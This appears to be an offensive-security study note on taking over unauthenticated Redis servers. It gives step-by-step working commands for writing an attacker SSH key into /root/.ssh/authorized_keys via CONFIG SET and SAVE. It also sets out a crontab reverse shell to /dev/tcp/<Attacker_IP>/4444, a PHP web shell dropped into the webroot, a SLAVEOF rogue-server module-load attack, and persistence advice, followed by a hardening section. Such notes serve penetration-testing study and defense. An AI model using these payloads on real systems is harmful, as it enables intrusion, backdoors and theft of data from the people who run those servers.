---
tags: [redis, unauthenticated-access, rce, config-set, ssh-keys]
difficulty: advanced
module: "35 - Network Protocol Attacks"
topic: "35.16 Redis"
---

# 16 - Redis: Unauthenticated Access & RCE via Config Set

## 1. Executive Summary

Redis (Remote Dictionary Server) is an extremely fast, open-source, in-memory key-value data store used heavily as a database, cache, message broker, and queue. By default, Redis listens on **TCP Port 6379**. Historically, Redis shipped with an incredibly dangerous default configuration: it bound to all network interfaces (`0.0.0.0`) and completely lacked authentication. 

When exposed to the internet or an untrusted local network, an unauthenticated Redis instance is practically a guaranteed root-level compromise. Attackers can leverage its built-in database saving mechanisms to write arbitrary files to the host filesystem, leading to Remote Code Execution (RCE) via SSH key injection, crontab manipulation, or web shell deployment.

## 2. Protocol Overview & Architecture

Redis uses the **REdis Serialization Protocol (RESP)**, which operates over plain text TCP. RESP is human-readable, meaning you can interact with a Redis server using a standard telnet or netcat client, though the official `redis-cli` tool provides a much better experience.

### Key Features Abused by Attackers
1. **In-Memory to Disk Persistence:** Redis holds data in memory but can snapshot it to disk (RDB files) or append commands to a log (AOF). Attackers manipulate where and how this data is written.
2. **`CONFIG SET` Command:** Allows administrators (or unauthenticated attackers) to reconfigure the server at runtime. Specifically, the `dir` (working directory) and `dbfilename` (dump file name) parameters can be changed dynamically.
3. **Master-Slave Replication:** Redis supports replication. An attacker can set their own machine as the "master" and force the victim server to synchronize with it, allowing the transfer of malicious modules.

## 3. Enumeration & Footprinting

Identifying an exposed Redis instance is straightforward due to its clear-text nature.

### Nmap Enumeration
```bash
# Basic port scan and script enumeration
nmap -p 6379 -sV --script redis-info <Target_IP>
```

### Manual Interaction
You can connect using netcat or the official CLI. Once connected, issuing the `INFO` command dumps immense amounts of configuration and version data.

```bash
# Connect via netcat
nc -nv <Target_IP> 6379
> INFO
> PING
+PONG

# Connect via redis-cli
redis-cli -h <Target_IP>
<Target_IP>:6379> INFO server
<Target_IP>:6379> INFO keyspace
```

## 4. Exploitation Deep Dive: Arbitrary File Write

The core vulnerability relies on flushing arbitrary data into a Redis key and then forcing Redis to save its database to a sensitive location on the host OS. Because Redis databases are written mostly in plaintext and many parsers (like SSH and Cron) gracefully ignore malformed garbage data, the injected payload executes successfully.

### 4.1 RCE Vector 1: SSH Authorized Keys Injection

If Redis is running as `root` (common in older setups) or a user with a `.ssh` directory, attackers can write their public SSH key into the `authorized_keys` file.

**Step-by-Step:**
1. Generate an SSH keypair on the attacker machine:
   ```bash
   ssh-keygen -t rsa -C "redis_hack"
   (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > pub_key.txt
   ```
   *Note: The newlines are critical to ensure the key is on its own line when the Redis RDB garbage data surrounds it.*

2. Flush the key into Redis:
   ```bash
   cat pub_key.txt | redis-cli -h <Target_IP> -x set ssh_key
   ```

3. Reconfigure Redis to write to the `.ssh` directory:
   ```bash
   redis-cli -h <Target_IP>
   > CONFIG SET dir /root/.ssh/
   > CONFIG SET dbfilename authorized_keys
   > SAVE
   > EXIT
   ```

4. SSH into the box:
   ```bash
   ssh root@<Target_IP> -i id_rsa
   ```

### 4.2 RCE Vector 2: Crontab Injection

If the SSH port is closed or the user isn't root, attackers can target the system's cron spool directory.

**Step-by-Step:**
1. Create the cron payload (e.g., a reverse shell running every minute):
   ```bash
   echo -e "\n\n*/1 * * * * root bash -c 'sh -i >& /dev/tcp/<Attacker_IP>/4444 0>&1'\n\n" | redis-cli -h <Target_IP> -x set cron_job
   ```

2. Point the Redis database to the cron directory:
   ```bash
   redis-cli -h <Target_IP>
   > CONFIG SET dir /var/spool/cron/crontabs/  # Or /var/spool/cron/ on RHEL/CentOS
   > CONFIG SET dbfilename root
   > SAVE
   ```
   *Wait 1 minute, and the reverse shell will connect back to the attacker's listener.*

### 4.3 RCE Vector 3: Web Shell Deployment

If a web server is running on the same host and the webroot is known (e.g., `/var/www/html/`), write a PHP shell.

```bash
redis-cli -h <Target_IP>
> SET webshell "<?php system($_GET['cmd']); ?>"
> CONFIG SET dir /var/www/html/
> CONFIG SET dbfilename shell.php
> SAVE
```

## 5. Advanced Exploitation: SLAVEOF Rogue Server (Module Load)

In modern Redis environments running as non-root, the aforementioned methods might fail due to file permissions. However, Redis 4.x and 5.x introduced loadable modules. Attackers can use the replication feature to bypass local file restrictions and achieve execution.

**The SLAVEOF Attack Flow:**
1. The attacker sets up a fake Redis server.
2. The attacker connects to the victim Redis and issues the `SLAVEOF <Attacker_IP> <Port>` command.
3. The victim connects to the attacker and begins syncing.
4. The attacker's rogue server sends a malicious compiled `.so` file (Redis module) instead of a standard RDB database.
5. The victim saves this `.so` file to disk.
6. The attacker issues `MODULE LOAD /path/to/malicious.so` to load the module, instantly executing arbitrary C code (e.g., spawning a reverse shell).

*Tooling:* Scripts like `redis-rogue-server` automate this entire process perfectly.

## 6. ASCII Architecture & Attack Diagram

```text
+-----------------------+           +---------------------------------+
|                       |  TCP 6379 |       Victim Redis Server       |
|  Attacker Machine     |==========>|       (Unauthenticated)         |
|                       |           |                                 |
+-----------------------+           +---------------------------------+
           |                                         |
           | 1. SET ssh_key "\n\n<ssh-rsa...>\n\n"   |
           |---------------------------------------->|
           |                                         |
           | 2. CONFIG SET dir /root/.ssh            |
           |---------------------------------------->|
           |                                         |
           | 3. CONFIG SET dbfilename authorized_keys|
           |---------------------------------------->|
           |                                         |
           | 4. SAVE                                 |
           |---------------------------------------->|
           |                                         | 5. Writes RDB File
           |                                         v
           |                                +-------------------------+
           | 6. SSH login using private key |   Underlying Host OS    |
           |===============================>|   /root/.ssh/auth...    |
           |                                +-------------------------+
```

## 7. Post-Exploitation & Persistence

- **Privilege Escalation:** If Redis is running as a low-privileged user, check the saved configuration files. Application source code interacting with Redis often contains hardcoded credentials for other services.
- **Data Theft:** Dump the legitimate Redis database. It often contains session tokens, password reset links, caching layers for web applications, or raw API keys.
- **Persistence:** Leave a backdoor via an injected cron job or an SSH key. Additionally, modify the actual `redis.conf` to guarantee backdoor survival across reboots.

## 8. Defense, Mitigation, & Hardening

1. **Authentication (Requirepass):** Always enforce authentication by setting the `requirepass` directive in `redis.conf`. From Redis 6.0 onwards, use Access Control Lists (ACLs) to manage multiple users and permissions.
2. **Network Binding:** Never bind Redis to `0.0.0.0` unless absolutely necessary. Bind to `127.0.0.1` or a dedicated internal management IP.
3. **Firewall / Security Groups:** Block port 6379 at the perimeter firewall and enforce strict network segmentation.
4. **Disable Dangerous Commands:** Use the `rename-command` directive to rename or disable commands like `CONFIG`, `FLUSHDB`, `FLUSHALL`, and `MODULE`.
   ```text
   rename-command CONFIG ""
   rename-command MODULE ""
   ```
5. **Least Privilege:** Run the `redis-server` process as a dedicated, low-privileged user (e.g., `redis`). Never run Redis as `root`. 

## 9. Chaining Opportunities

- **SSRF (Server-Side Request Forgery):** If Redis is bound locally (127.0.0.1) but the application is vulnerable to SSRF (e.g., via a gopher:// or dict:// payload), attackers can tunnel the `CONFIG SET` commands through the web application to achieve RCE. See **[[07 - Server-Side Request Forgery (SSRF)]]**.
- **Privilege Escalation:** A foothold obtained via a non-root Redis service often leads directly into Linux Privilege Escalation vectors. See **[[08 - Linux Privilege Escalation]]**.

## 10. Related Notes
- [[15 - MySQL MSSQL PostgreSQL — Remote Access, Brute Force, UDF]]
- [[17 - MongoDB — No Auth, Exposed Port]]
- [[19 - Memcached — Amplification Attack, Data Dumping]]
- [[20 - Docker API — Exposed Daemon, Container Escape]]
